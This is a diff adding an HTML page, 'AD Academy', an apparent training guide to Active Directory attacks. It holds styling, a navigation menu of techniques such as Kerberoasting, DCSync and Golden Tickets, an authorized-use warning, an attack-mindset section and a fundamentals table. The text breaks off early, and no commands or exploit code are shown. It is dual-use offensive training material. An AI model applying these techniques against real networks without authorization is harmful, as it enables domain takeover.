@@ -1,0 +1,2645 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AD Academy · Active Directory Privilege Escalation</title>
+  <style>
+    :root {
+      --bg: #0b0f17;
+      --surface: #141b24;
+      --surface2: #1e2936;
+      --border: #2a3a4a;
+      --text: #e6edf5;
+      --text-dim: #9aaec2;
+      --accent: #2dd4bf;
+      --accent2: #3b82f6;
+      --danger: #f87171;
+      --warn: #fbbf24;
+      --success: #4ade80;
+      --code-bg: #0a0f14;
+      --shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
+      --radius: 14px;
+      --sidebar-width: 280px;
+      --font: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+      --mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+    }
+
+    [data-theme="light"] {
+      --bg: #f0f4f8;
+      --surface: #ffffff;
+      --surface2: #f8fafc;
+      --border: #cbd5e1;
+      --text: #0b1e2e;
+      --text-dim: #475569;
+      --accent: #0d9488;
+      --accent2: #2563eb;
+      --danger: #dc2626;
+      --warn: #d97706;
+      --success: #16a34a;
+      --code-bg: #1e293b;
+      --shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--font);
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      transition: background 0.2s, color 0.2s;
+      overflow-x: hidden;
+    }
+
+    ::-webkit-scrollbar { width: 10px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+    #sidebar {
+      position: fixed; top: 0; left: 0;
+      width: var(--sidebar-width); height: 100vh;
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      overflow-y: auto; padding: 1.2rem 0.8rem;
+      z-index: 100; transition: transform 0.3s;
+      display: flex; flex-direction: column; gap: 0.4rem;
+    }
+
+    #sidebar .logo {
+      font-size: 1.3rem; font-weight: 800;
+      letter-spacing: -0.5px;
+      padding: 0.5rem 0.8rem 1rem;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 0.6rem;
+    }
+
+    #sidebar .logo span { color: var(--accent); }
+
+    .nav-group { margin-bottom: 0.4rem; }
+
+    .nav-group-title {
+      font-size: 0.7rem; text-transform: uppercase;
+      letter-spacing: 1.5px; color: var(--text-dim);
+      padding: 0.6rem 0.8rem 0.2rem; font-weight: 700;
+    }
+
+    .nav-link {
+      display: block; padding: 0.4rem 0.8rem;
+      color: var(--text-dim); text-decoration: none;
+      border-radius: 8px; font-size: 0.88rem;
+      transition: all 0.15s; cursor: pointer;
+      border-left: 3px solid transparent;
+    }
+
+    .nav-link:hover { background: var(--surface2); color: var(--text); }
+    .nav-link.active {
+      background: var(--surface2); color: var(--accent);
+      border-left-color: var(--accent); font-weight: 600;
+    }
+
+    #main {
+      margin-left: var(--sidebar-width);
+      padding: 1.5rem 2.5rem 4rem;
+      max-width: 1200px;
+    }
+
+    .topbar {
+      display: flex; justify-content: space-between;
+      align-items: center; flex-wrap: wrap; gap: 1rem;
+      margin-bottom: 2rem; position: sticky; top: 0;
+      z-index: 50; background: var(--bg);
+      padding: 0.8rem 0; border-bottom: 1px solid var(--border);
+    }
+
+    .search-box { flex: 1; min-width: 200px; max-width: 500px; position: relative; }
+
+    .search-box input {
+      width: 100%; padding: 0.7rem 1rem 0.7rem 2.4rem;
+      border-radius: 50px; border: 1px solid var(--border);
+      background: var(--surface); color: var(--text);
+      font-size: 0.9rem; outline: none; transition: border 0.2s;
+    }
+
+    .search-box input:focus { border-color: var(--accent); }
+
+    .search-box::before {
+      content: "🔍"; position: absolute; left: 0.9rem;
+      top: 50%; transform: translateY(-50%);
+      font-size: 0.9rem; opacity: 0.6;
+    }
+
+    .theme-toggle {
+      background: var(--surface); border: 1px solid var(--border);
+      color: var(--text); padding: 0.6rem 1rem;
+      border-radius: 50px; cursor: pointer;
+      font-size: 0.9rem; transition: all 0.2s;
+    }
+
+    .theme-toggle:hover { border-color: var(--accent); }
+
+    .section { margin-bottom: 2.5rem; scroll-margin-top: 80px; }
+
+    .section h2 {
+      font-size: 1.7rem; font-weight: 700;
+      margin-bottom: 0.5rem; display: flex;
+      align-items: center; gap: 0.6rem;
+    }
+
+    .section h2 .badge {
+      font-size: 0.7rem; background: var(--accent);
+      color: #0b0f17; padding: 0.15rem 0.6rem;
+      border-radius: 50px; font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .section h3 {
+      font-size: 1.25rem; margin: 1.5rem 0 0.7rem;
+      color: var(--accent); font-weight: 600;
+    }
+
+    .section h4 {
+      font-size: 1.05rem; margin: 1rem 0 0.4rem;
+      color: var(--text); font-weight: 600;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.5rem; margin-bottom: 1.2rem;
+      box-shadow: var(--shadow); transition: border 0.2s;
+    }
+
+    .card:hover { border-color: var(--accent); }
+    .card.warn { border-left: 4px solid var(--warn); }
+    .card.danger { border-left: 4px solid var(--danger); }
+    .card.success { border-left: 4px solid var(--success); }
+
+    .callout {
+      background: var(--surface2);
+      border-left: 4px solid var(--accent2);
+      padding: 1rem 1.2rem;
+      border-radius: 8px; margin: 1rem 0;
+      font-size: 0.92rem;
+    }
+
+    .callout.warn { border-left-color: var(--warn); }
+    .callout.danger { border-left-color: var(--danger); }
+    .callout.success { border-left-color: var(--success); }
+    .callout strong { color: var(--accent); }
+
+    .code-block {
+      position: relative; background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px; margin: 0.8rem 0;
+      overflow: hidden; font-family: var(--mono);
+      font-size: 0.85rem;
+    }
+
+    .code-header {
+      display: flex; justify-content: space-between;
+      align-items: center; padding: 0.5rem 1rem;
+      background: rgba(255, 255, 255, 0.04);
+      border-bottom: 1px solid var(--border);
+      font-size: 0.75rem; color: var(--text-dim);
+      text-transform: uppercase; letter-spacing: 1px;
+    }
+
+    .code-header button {
+      background: transparent; border: 1px solid var(--border);
+      color: var(--text-dim); padding: 0.2rem 0.7rem;
+      border-radius: 5px; cursor: pointer;
+      font-size: 0.7rem; transition: all 0.15s;
+    }
+
+    .code-header button:hover { border-color: var(--accent); color: var(--accent); }
+
+    .code-block pre {
+      padding: 1rem; overflow-x: auto;
+      color: #e2e8f0; line-height: 1.5;
+    }
+
+    .code-block pre .cmd { color: #4ade80; }
+    .code-block pre .comment { color: #64748b; font-style: italic; }
+
+    table {
+      width: 100%; border-collapse: collapse;
+      margin: 1rem 0; font-size: 0.88rem;
+      border-radius: 10px; overflow: hidden;
+    }
+
+    th, td {
+      padding: 0.7rem 1rem; text-align: left;
+      border-bottom: 1px solid var(--border);
+    }
+
+    th {
+      background: var(--surface2); color: var(--accent);
+      font-weight: 600; text-transform: uppercase;
+      font-size: 0.72rem; letter-spacing: 1px;
+    }
+
+    tr:hover { background: var(--surface2); }
+
+    .accordion {
+      border: 1px solid var(--border);
+      border-radius: 10px; margin: 0.6rem 0; overflow: hidden;
+    }
+
+    .accordion-header {
+      padding: 0.9rem 1.2rem; background: var(--surface2);
+      cursor: pointer; font-weight: 600;
+      display: flex; justify-content: space-between;
+      align-items: center; transition: background 0.15s;
+    }
+
+    .accordion-header:hover { background: var(--border); }
+
+    .accordion-header::after {
+      content: "▸"; transition: transform 0.2s;
+    }
+
+    .accordion.open .accordion-header::after { transform: rotate(90deg); }
+
+    .accordion-body {
+      max-height: 0; overflow: hidden;
+      transition: max-height 0.5s ease;
+      padding: 0 1.2rem; background: var(--surface);
+    }
+
+    .accordion.open .accordion-body {
+      max-height: 12000px; padding: 1rem 1.2rem;
+    }
+
+    .checklist { list-style: none; display: flex; flex-direction: column; gap: 0.5rem; }
+    .checklist li { display: flex; align-items: flex-start; gap: 0.7rem; font-size: 0.92rem; }
+    .checklist input[type="checkbox"] {
+      margin-top: 0.25rem; accent-color: var(--accent);
+      width: 18px; height: 18px; cursor: pointer;
+    }
+
+    .tabs {
+      display: flex; gap: 0.3rem;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 1rem; flex-wrap: wrap;
+    }
+
+    .tab-btn {
+      padding: 0.6rem 1.2rem; background: transparent;
+      border: none; color: var(--text-dim);
+      cursor: pointer; font-size: 0.88rem;
+      border-bottom: 2px solid transparent;
+      transition: all 0.15s; font-family: var(--font);
+    }
+
+    .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+    .tab-btn:hover { color: var(--text); }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
+
+    .progress-bar {
+      position: fixed; top: 0; left: 0; height: 3px;
+      background: var(--accent); z-index: 200;
+      transition: width 0.1s;
+    }
+
+    #backToTop {
+      position: fixed; bottom: 2rem; right: 2rem;
+      background: var(--accent); color: #0b0f17;
+      border: none; width: 48px; height: 48px;
+      border-radius: 50%; cursor: pointer;
+      font-size: 1.2rem; display: none;
+      align-items: center; justify-content: center;
+      box-shadow: 0 4px 20px rgba(45, 212, 191, 0.4);
+      z-index: 150; transition: transform 0.2s;
+    }
+
+    #backToTop:hover { transform: scale(1.1); }
+
+    .highlight {
+      background: rgba(251, 191, 36, 0.35);
+      border-radius: 3px; padding: 0 2px;
+    }
+
+    .nav-buttons {
+      display: flex; justify-content: space-between;
+      margin-top: 3rem; gap: 1rem;
+    }
+
+    .nav-buttons button {
+      padding: 0.8rem 1.5rem; background: var(--surface);
+      border: 1px solid var(--border); color: var(--text);
+      border-radius: 10px; cursor: pointer;
+      font-size: 0.9rem; transition: all 0.2s;
+    }
+
+    .nav-buttons button:hover { border-color: var(--accent); background: var(--surface2); }
+
+    @media (max-width: 900px) {
+      #sidebar { transform: translateX(-100%); }
+      #sidebar.open { transform: translateX(0); }
+      #main { margin-left: 0; padding: 1rem; }
+      .menu-toggle { display: block !important; }
+    }
+
+    .menu-toggle {
+      display: none; background: var(--surface);
+      border: 1px solid var(--border); color: var(--text);
+      padding: 0.5rem 0.8rem; border-radius: 8px;
+      cursor: pointer; font-size: 1.2rem;
+    }
+
+    .hidden { display: none !important; }
+
+    ul, ol { padding-left: 1.3rem; margin: 0.5rem 0; }
+    li { margin: 0.2rem 0; }
+    p { margin: 0.6rem 0; }
+    a { color: var(--accent2); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+    @media (max-width: 700px) { .grid-2 { grid-template-columns: 1fr; } }
+
+    .why-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.8rem;
+      margin: 1rem 0;
+    }
+
+    @media (max-width: 700px) {
+      .why-grid { grid-template-columns: 1fr; }
+    }
+
+    .why-card {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      border-left: 3px solid var(--accent);
+      transition: border 0.2s;
+    }
+
+    .why-card:hover {
+      border-left-color: var(--accent2);
+      background: var(--surface);
+    }
+
+    .why-card .label {
+      display: inline-block;
+      font-size: 0.68rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: var(--accent);
+      margin-bottom: 0.4rem;
+      padding: 0.15rem 0.5rem;
+      background: rgba(45, 212, 191, 0.1);
+      border-radius: 4px;
+    }
+
+    .why-card .label.why { color: var(--warn); background: rgba(251, 191, 36, 0.1); }
+    .why-card .label.how { color: var(--accent2); background: rgba(59, 130, 246, 0.1); }
+    .why-card .label.when { color: var(--success); background: rgba(74, 222, 128, 0.1); }
+    .why-card .label.limit { color: var(--danger); background: rgba(248, 113, 113, 0.1); }
+    .why-card .label.blue { color: #60a5fa; background: rgba(96, 165, 250, 0.1); }
+    .why-card .label.purple { color: #c084fc; background: rgba(192, 132, 252, 0.1); }
+
+    .why-card p {
+      font-size: 0.88rem;
+      margin: 0.3rem 0 0;
+      color: var(--text);
+    }
+
+    .why-card p.dim {
+      color: var(--text-dim);
+      font-size: 0.82rem;
+    }
+
+    .flow {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 0.5rem;
+      margin: 1rem 0;
+      font-size: 0.85rem;
+    }
+
+    .flow .step {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      padding: 0.5rem 1rem;
+      border-radius: 50px;
+      font-weight: 600;
+    }
+
+    .flow .arrow {
+      color: var(--accent);
+      font-weight: 700;
+      font-size: 1.2rem;
+    }
+
+    .section-intro {
+      background: linear-gradient(135deg, var(--surface2), var(--surface));
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--accent);
+      border-radius: var(--radius);
+      padding: 1.2rem 1.5rem;
+      margin-bottom: 1.2rem;
+      font-size: 0.95rem;
+    }
+
+    .section-intro strong { color: var(--accent); }
+
+    .mental-model {
+      background: rgba(59, 130, 246, 0.06);
+      border: 1px dashed var(--accent2);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      margin: 1rem 0;
+      font-size: 0.9rem;
+    }
+
+    .mental-model .title {
+      font-weight: 700;
+      color: var(--accent2);
+      margin-bottom: 0.4rem;
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .exploit-check {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      margin: 1rem 0;
+      font-family: var(--mono);
+      font-size: 0.82rem;
+      color: #cbd5e1;
+      line-height: 1.7;
+    }
+
+    .exploit-check .title {
+      font-family: var(--font);
+      font-weight: 700;
+      color: var(--warn);
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 0.6rem;
+      display: block;
+    }
+
+    .exploit-check .ok { color: #4ade80; }
+    .exploit-check .no { color: #64748b; }
+
+    .reliability {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-size: 0.78rem;
+      font-weight: 700;
+      padding: 0.25rem 0.7rem;
+      border-radius: 50px;
+      margin-left: 0.5rem;
+      vertical-align: middle;
+    }
+
+    .rel-green { background: rgba(74, 222, 128, 0.15); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
+    .rel-yellow { background: rgba(251, 191, 36, 0.15); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3); }
+    .rel-red { background: rgba(248, 113, 113, 0.15); color: #f87171; border: 1px solid rgba(248, 113, 113, 0.3); }
+
+    .detection-box {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.8rem;
+      margin: 1rem 0;
+    }
+
+    @media (max-width: 700px) { .detection-box { grid-template-columns: 1fr; } }
+
+    .detect-card {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      font-size: 0.85rem;
+    }
+
+    .detect-card .hdr {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      font-weight: 800;
+      margin-bottom: 0.5rem;
+      display: block;
+    }
+
+    .detect-card.red .hdr { color: #f87171; }
+    .detect-card.blue .hdr { color: #60a5fa; }
+    .detect-card.green .hdr { color: #4ade80; }
+
+    .detect-card code {
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      color: #4ade80;
+      background: rgba(74, 222, 128, 0.08);
+      padding: 0.1rem 0.35rem;
+      border-radius: 4px;
+    }
+
+    .trust-flow {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      margin: 1.5rem 0;
+      padding: 1.2rem;
+      background: var(--surface2);
+      border-radius: 12px;
+      border: 1px solid var(--border);
+    }
+
+    .trust-flow .node {
+      background: var(--surface);
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      padding: 0.6rem 1.2rem;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 0.85rem;
+      text-align: center;
+      min-width: 100px;
+    }
+
+    .trust-flow .node.final {
+      border-color: var(--danger);
+      color: var(--danger);
+    }
+
+    .trust-flow .arrow {
+      color: var(--accent2);
+      font-weight: 700;
+      font-size: 1.4rem;
+    }
+
+    @media (max-width: 700px) {
+      .trust-flow { flex-direction: column; }
+      .trust-flow .arrow { transform: rotate(90deg); }
+    }
+
+    .vuln-table td:first-child {
+      font-weight: 700;
+      color: var(--accent);
+    }
+
+    .matrix-row {
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .matrix-row:hover {
+      background: var(--surface2);
+    }
+
+    .matrix-row:hover td:first-child {
+      color: var(--accent);
+    }
+
+    .exploit-block {
+      background: linear-gradient(135deg, rgba(248, 113, 113, 0.05), rgba(251, 191, 36, 0.05));
+      border: 1px solid rgba(248, 113, 113, 0.3);
+      border-radius: 12px;
+      padding: 1.2rem 1.5rem;
+      margin: 1.2rem 0;
+      position: relative;
+    }
+
+    .exploit-block::before {
+      content: "⚠️ LAB EXPLOITATION — AUTHORIZED ENVIRONMENTS ONLY";
+      display: block;
+      font-size: 0.7rem;
+      font-weight: 800;
+      letter-spacing: 1.5px;
+      color: #f87171;
+      margin-bottom: 0.8rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px dashed rgba(248, 113, 113, 0.3);
+    }
+
+    .exploit-block h5 {
+      font-size: 0.95rem;
+      color: var(--warn);
+      margin: 0.8rem 0 0.4rem;
+      font-weight: 700;
+    }
+
+    .exploit-block p {
+      font-size: 0.88rem;
+      margin: 0.4rem 0;
+    }
+
+    .author-footer {
+      margin-top: 4rem;
+      padding: 2rem;
+      background: linear-gradient(135deg, var(--surface2), var(--surface));
+      border: 1px solid var(--border);
+      border-top: 3px solid var(--accent);
+      border-radius: var(--radius);
+      text-align: center;
+    }
+
+    .author-footer h3 {
+      font-size: 1.4rem;
+      color: var(--accent);
+      margin-bottom: 0.4rem;
+      justify-content: center;
+    }
+
+    .author-footer .author-name {
+      font-size: 1.8rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin: 0.5rem 0;
+    }
+
+    .author-footer .tagline {
+      color: var(--text-dim);
+      font-size: 0.95rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .author-links {
+      display: flex;
+      justify-content: center;
+      gap: 0.8rem;
+      flex-wrap: wrap;
+      margin-top: 1rem;
+    }
+
+    .author-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.7rem 1.4rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 50px;
+      color: var(--text);
+      text-decoration: none;
+      font-size: 0.88rem;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+
+    .author-link:hover {
+      border-color: var(--accent);
+      color: var(--accent);
+      text-decoration: none;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(45, 212, 191, 0.2);
+    }
+
+    .author-link .icon { font-size: 1.1rem; }
+
+    .author-link.linkedin:hover { border-color: #0a66c2; color: #0a66c2; }
+    .author-link.medium:hover { border-color: #ffffff; color: #ffffff; }
+    .author-link.github:hover { border-color: #a855f7; color: #a855f7; }
+
+    .sidebar-author {
+      margin-top: auto;
+      padding: 1rem 0.8rem;
+      border-top: 1px solid var(--border);
+      font-size: 0.78rem;
+      color: var(--text-dim);
+      text-align: center;
+    }
+
+    .sidebar-author strong {
+      color: var(--accent);
+      display: block;
+      font-size: 0.85rem;
+      margin-bottom: 0.3rem;
+    }
+
+    .sidebar-author a {
+      color: var(--text-dim);
+      text-decoration: none;
+      display: inline-block;
+      margin: 0.15rem 0.3rem;
+      font-size: 0.75rem;
+    }
+
+    .sidebar-author a:hover { color: var(--accent); }
+  </style>
+</head>
+<body>
+
+  <div class="progress-bar" id="progressBar" style="width:0%"></div>
+
+  <nav id="sidebar">
+    <div class="logo">🛡️ <span>AD</span> Academy</div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Home</div>
+      <a class="nav-link active" data-target="home">🏠 Overview</a>
+      <a class="nav-link" data-target="safety">⚠️ Authorized Use</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Fundamentals</div>
+      <a class="nav-link" data-target="mindset">🧠 AD Attack Mindset</a>
+      <a class="nav-link" data-target="ad-basics">📘 AD Fundamentals</a>
+      <a class="nav-link" data-target="attack-chain">⛓️ Attack Chain</a>
+      <a class="nav-link" data-target="workflow">🔄 Enum→Exploit Workflow</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Enumeration</div>
+      <a class="nav-link" data-target="enum-overview">🔍 Enumeration Overview</a>
+      <a class="nav-link" data-target="enum-powerview">⚡ PowerView / SharpHound</a>
+      <a class="nav-link" data-target="enum-bloodhound">🩸 BloodHound</a>
+      <a class="nav-link" data-target="enum-users">👤 Users & Groups</a>
+      <a class="nav-link" data-target="enum-computers">💻 Computers & Trusts</a>
+      <a class="nav-link" data-target="enum-shares">📁 Shares & Sessions</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Initial Access</div>
+      <a class="nav-link" data-target="cred-attacks">🔑 Credential Attacks</a>
+      <a class="nav-link" data-target="kerberos">🎟️ Kerberos Attacks</a>
+      <a class="nav-link" data-target="relay">🔄 NTLM Relay</a>
+      <a class="nav-link" data-target="asrep">🔓 AS-REP Roasting</a>
+      <a class="nav-link" data-target="kerberoast">🔥 Kerberoasting</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">PrivEsc Paths</div>
+      <a class="nav-link" data-target="acl-abuse">📋 ACL Abuse</a>
+      <a class="nav-link" data-target="delegation">🎫 Delegation</a>
+      <a class="nav-link" data-target="adcs">📜 ADCS Abuse</a>
+      <a class="nav-link" data-target="gpo">📝 GPO Abuse</a>
+      <a class="nav-link" data-target="trusts">🔗 Domain Trusts</a>
+      <a class="nav-link" data-target="dcsync">👑 DCSync</a>
+      <a class="nav-link" data-target="golden">🥇 Golden / Silver Tickets</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Post-Exploitation</div>
+      <a class="nav-link" data-target="lateral">↔️ Lateral Movement</a>
+      <a class="nav-link" data-target="persistence">🔒 Persistence</a>
+      <a class="nav-link" data-target="dc-takeover">🏛️ Domain Controller</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Advanced</div>
+      <a class="nav-link" data-target="chaining">🔗 Attack Chaining</a>
+      <a class="nav-link" data-target="matrix">📊 Technique Matrix</a>
+      <a class="nav-link" data-target="ad-checklist">✅ Field Checklist</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Reference</div>
+      <a class="nav-link" data-target="decision-tree">🌳 Decision Tree</a>
+      <a class="nav-link" data-target="labs">🧪 Labs</a>
+      <a class="nav-link" data-target="troubleshooting">🔧 Troubleshooting</a>
+      <a class="nav-link" data-target="detection">🛡️ Detection & Defense</a>
+      <a class="nav-link" data-target="cheatsheets">📋 Cheat Sheets</a>
+      <a class="nav-link" data-target="knowledge-check">❓ Knowledge Check</a>
+    </div>
+
+    <div class="sidebar-author">
+      <strong>Made by Chandan Kumar</strong>
+      <a href="https://linkedin.com/in/chandan-kumar-eh" target="_blank" rel="noopener">LinkedIn</a> ·
+      <a href="https://medium.com/@chandan20516" target="_blank" rel="noopener">Medium</a> ·
+      <a href="https://github.com/chandan-44" target="_blank" rel="noopener">GitHub</a>
+    </div>
+  </nav>
+
+  <div id="main">
+
+    <div class="topbar">
+      <button class="menu-toggle" id="menuToggle">☰</button>
+      <div class="search-box">
+        <input type="text" id="searchInput" placeholder="Search AD techniques, tools, commands...">
+      </div>
+      <button class="theme-toggle" id="themeToggle">🌙 Dark</button>
+    </div>
+
+    <!-- ==================== HOME ==================== -->
+    <section class="section" id="home">
+      <h2>🛡️ Active Directory <span class="badge">Attack Academy</span></h2>
+      <p style="font-size:1.05rem; color: var(--text-dim); max-width: 800px;">
+        A deep, structured, interactive reference guide for learning Active Directory enumeration, attack paths, and privilege escalation.
+        From fundamentals to advanced techniques — built for CTFs, labs, and authorized security validation.
+      </p>
+
+      <div class="grid-2" style="margin-top:1.5rem;">
+        <div class="card success">
+          <h4>🔍 Enumeration</h4>
+          <p>PowerView, BloodHound, SharpHound, LDAP queries, trusts, ACLs, shares, and sessions.</p>
+        </div>
+        <div class="card success">
+          <h4>⚔️ Attack Paths</h4>
+          <p>Kerberoasting, AS-REP, ACL abuse, delegation, ADCS, DCSync, Golden Tickets, and more.</p>
+        </div>
+      </div>
+
+      <div class="callout">
+        <strong>How to use this guide:</strong> Start with the AD fundamentals, then work through enumeration. Every technique explains <em>why</em> it works, what to enumerate, how to validate, and how to exploit in a lab.
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 The Core Mental Model</div>
+        <p>Active Directory is a graph of relationships. Privilege escalation is about finding a path from your user to Domain Admin through those relationships:</p>
+        <p style="margin-top:0.5rem; font-weight:600; color: var(--accent);">
+          "What permissions do I have over other objects, and how do they chain to Domain Admin?"
+        </p>
+      </div>
+    </section>
+
+    <!-- ==================== SAFETY ==================== -->
+    <section class="section" id="safety">
+      <h2>⚠️ Authorized Use Only</h2>
+      <div class="card danger">
+        <p><strong>All techniques in this guide are for:</strong></p>
+        <ul class="checklist">
+          <li><input type="checkbox" checked disabled> Your own AD lab environments (GOAD, DetectionLab, etc.)</li>
+          <li><input type="checkbox" checked disabled> CTF platforms with AD challenges (HTB, TryHackMe)</li>
+          <li><input type="checkbox" checked disabled> Authorized penetration testing engagements</li>
+          <li><input type="checkbox" checked disabled> Systems where you have explicit written authorization</li>
+        </ul>
+        <p style="margin-top:1rem; color: var(--danger);">
+          <strong>Do not</strong> use these techniques against production Active Directory environments without authorization.
+          AD attacks can be destructive — they can lock accounts, break services, and cause outages.
+        </p>
+        <p style="margin-top:1rem; padding-top:1rem; border-top:1px dashed var(--border); font-size:0.85rem; color: var(--text-dim);">
+          <strong style="color: var(--warn);">About exploitation commands:</strong> This guide includes lab-only exploitation steps in
+          clearly marked <em>Exploitation</em> blocks. Use them only in authorized lab environments.
+        </p>
+      </div>
+    </section>
+
+    <!-- ==================== MINDSET ==================== -->
+    <section class="section" id="mindset">
+      <h2>🧠 AD Attack Mindset</h2>
+
+      <div class="section-intro">
+        <strong>AD is a graph, not a list.</strong> Every user, group, computer, and GPO is a node. Every permission, trust, and session is an edge. Attacks are paths through that graph.
+      </div>
+
+      <h3>The Universal AD Attack Chain</h3>
+
+      <div class="trust-flow">
+        <div class="node">ENUM</div>
+        <div class="arrow">→</div>
+        <div class="node">IDENTIFY</div>
+        <div class="arrow">→</div>
+        <div class="node">EXPLOIT</div>
+        <div class="arrow">→</div>
+        <div class="node">ESCALATE</div>
+        <div class="arrow">→</div>
+        <div class="node final">DA</div>
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">Enumerate</span>
+          <p>Enumerate users, groups, computers, GPOs, ACLs, trusts, sessions, and shares.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">Identify</span>
+          <p>Find a path — a permission, a trust, a misconfiguration — that crosses a boundary.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Exploit</span>
+          <p>Use the appropriate technique: Kerberoast, ACL abuse, delegation, ADCS, DCSync.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Escalate</span>
+          <p>Chain findings. From user → server admin → domain admin → forest admin.</p>
+        </div>
+      </div>
+
+      <h3>Eight Questions for Every AD Finding</h3>
+      <ol>
+        <li><strong>What object do I control?</strong> — My user, group, or computer?</li>
+        <li><strong>What permissions do I have?</strong> — Over which other objects?</li>
+        <li><strong>What does that permission grant?</strong> — Read? Write? Control?</li>
+        <li><strong>Can I exploit it directly?</strong> — Or do I need a chain?</li>
+        <li><strong>What's the target's privilege level?</strong> — User? Server Admin? DA?</li>
+        <li><strong>Is the target logged in?</strong> — Sessions matter for lateral movement.</li>
+        <li><strong>What's the timing?</strong> — Immediate? On reboot? On login?</li>
+        <li><strong>Can I reliably reach Domain Admin?</strong> — Or do I need pivoting?</li>
+      </ol>
+
+      <div class="mental-model">
+        <div class="title">🧠 Why this matters</div>
+        <p>AD attacks are about chaining small permissions. A single "GenericWrite" over a user is not Domain Admin — but combined with Kerberoasting, it is.</p>
+      </div>
+    </section>
+
+    <!-- ==================== AD BASICS ==================== -->
+    <section class="section" id="ad-basics">
+      <h2>📘 AD Fundamentals</h2>
+
+      <div class="section-intro">
+        <strong>You can't attack what you don't understand.</strong> AD is a directory service that stores objects and their relationships.
+      </div>
+
+      <h3>Core Concepts</h3>
+      <table>
+        <tr><th>Concept</th><th>What it is</th></tr>
+        <tr><td><strong>Domain</strong></td><td>A logical grouping of users, computers, and resources under a common directory database.</td></tr>
+        <tr><td><strong>Forest</strong></td><td>A collection of one or more domains that share a common schema and global catalog.</td></tr>
+        <tr><td><strong>Domain Controller (DC)</strong></td><td>A server that hosts the AD database and authenticates users.</td></tr>
+        <tr><td><strong>LDAP</strong></td><td>Protocol for querying and modifying AD.</td></tr>
+        <tr><td><strong>Kerberos</strong></td><td>The default authentication protocol for AD.</td></tr>
+        <tr><td><strong>NTLM</strong></td><td>Legacy authentication protocol — still used in many environments.</td></tr>
+        <tr><td><strong>SID</strong></td><td>Security Identifier — unique identifier for every object.</td></tr>
+        <tr><td><strong>ACL</strong></td><td>Access Control List — permissions on objects.</td></tr>
+        <tr><td><strong>GPO</strong></td><td>Group Policy Object — configuration applied to users/computers.</td></tr>
+      </table>
+
+      <h3>Key AD Objects</h3>
+      <ul>
+        <li><strong>User</strong> — accounts</li>
